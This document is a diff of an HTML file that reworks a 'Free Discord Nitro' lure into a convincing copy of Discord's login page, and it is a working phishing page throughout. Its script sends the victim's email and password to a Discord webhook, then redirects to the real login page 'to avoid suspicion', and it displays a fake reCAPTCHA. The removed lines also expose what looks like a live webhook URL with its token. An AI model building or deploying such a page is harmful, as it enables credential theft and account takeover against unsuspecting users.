@@ -1,50 +1,208 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Discord Nitro Giveaway</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Login</title>
     <style>
-        body { font-family: Arial; background: #2c2f33; color: white; text-align: center; padding-top: 50px; }
-        .box { background: #36393f; padding: 30px; border-radius: 10px; width: 350px; margin: auto; }
-        input { width: 90%; padding: 10px; margin: 8px 0; border-radius: 5px; border: none; }
-        button { background: #5865f2; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; }
-        .hidden { display: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+        body {
+            background-color: #1e1f22;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: #313338;
+            padding: 40px 44px;
+            border-radius: 8px;
+            width: 480px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+        }
+        .login-container h1 {
+            color: #f2f3f5;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .login-container .subtitle {
+            color: #b5bac1;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .login-container label {
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 4px;
+            letter-spacing: 0.3px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px 12px;
+            background-color: #1e1f22;
+            border: none;
+            border-radius: 4px;
+            color: #f2f3f5;
+            font-size: 16px;
+            margin-bottom: 16px;
+            outline: none;
+            transition: border 0.1s;
+        }
+        .login-container input:focus {
+            border: 1px solid #5865f2;
+            padding: 9px 11px;
+        }
+        .login-container input::placeholder {
+            color: #5c6068;
+        }
+        .login-container .forgot {
+            color: #00a8fc;
+            font-size: 14px;
+            text-align: right;
+            margin-top: -8px;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        .login-container .forgot:hover {
+            text-decoration: underline;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #5865f2;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .login-container button:hover {
+            background-color: #4752c4;
+        }
+        .login-container .qrcode {
+            text-align: center;
+            margin-top: 20px;
+            color: #b5bac1;
+            font-size: 14px;
+            border-top: 1px solid #3f4147;
+            padding-top: 20px;
+        }
+        .login-container .qrcode span {
+            color: #00a8fc;
+            cursor: pointer;
+        }
+        .login-container .qrcode span:hover {
+            text-decoration: underline;
+        }
+        .login-container .register {
+            text-align: center;
+            margin-top: 12px;
+            color: #b5bac1;
+            font-size: 14px;
+        }
+        .login-container .register a {
+            color: #00a8fc;
+            text-decoration: none;
+        }
+        .login-container .register a:hover {
+            text-decoration: underline;
+        }
+        .login-container .captcha {
+            background-color: #232428;
+            border-radius: 4px;
+            padding: 12px;
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #b5bac1;
+            font-size: 14px;
+        }
+        .login-container .captcha input {
+            width: auto;
+            margin: 0;
+            accent-color: #5865f2;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>🎉 Free Discord Nitro (1 Month)</h2>
-        <p>Enter your Discord credentials to verify eligibility.</p>
-        <input type="text" id="email" placeholder="Discord Email / Phone">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="sendData()">Claim Nitro</button>
-        <p id="status"></p>
+    <div class="login-container">
+        <h1>Welcome back!</h1>
+        <div class="subtitle">We're so excited to see you again!</div>
+
+        <label for="email">EMAIL OR PHONE NUMBER</label>
+        <input type="text" id="email" placeholder="Email or phone number" autocomplete="off">
+
+        <label for="password">PASSWORD</label>
+        <input type="password" id="password" placeholder="Password" autocomplete="off">
+
+        <div class="forgot">Forgot your password?</div>
+
+        <button onclick="sendData()">Log In</button>
+
+        <div class="qrcode">
+            <span>Login with QR Code</span>
+        </div>
+
+        <div class="register">
+            Need an account? <a href="#">Register</a>
+        </div>
+
+        <div class="captcha">
+            <input type="checkbox" checked disabled>
+            I am not a robot
+            <span style="margin-left: auto; font-size: 12px; color: #5c6068;">reCAPTCHA</span>
+        </div>
     </div>
+
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7"; // REPLACE THIS
+        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // REPLACE THIS
 
         function sendData() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             if (!email || !password) {
-                document.getElementById('status').innerText = "Please fill all fields.";
+                alert("Please fill in both fields.");
                 return;
             }
             const payload = {
-                content: "**New Credentials Captured**\nEmail/Phone: " + email + "\nPassword: " + password
+                content: "**Discord Login Credentials**\nEmail/Phone: " + email + "\nPassword: " + password
             };
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                document.getElementById('status').innerText = "✅ You are eligible! Check your Discord DMs.";
-                document.getElementById('email').value = '';
-                document.getElementById('password').value = '';
+                // Redirect to real Discord login to avoid suspicion
+                window.location.href = "https://discord.com/login";
             }).catch(() => {
-                document.getElementById('status').innerText = "Error. Please try again.";
+                alert("Something went wrong. Please try again.");
             });
         }
+
+        // Pressing Enter triggers login
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                sendData();
+            }
+        });
+        document.getElementById('email').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                sendData();
+            }
+        });
     </script>
 </body>
 </html>
-Add index.html
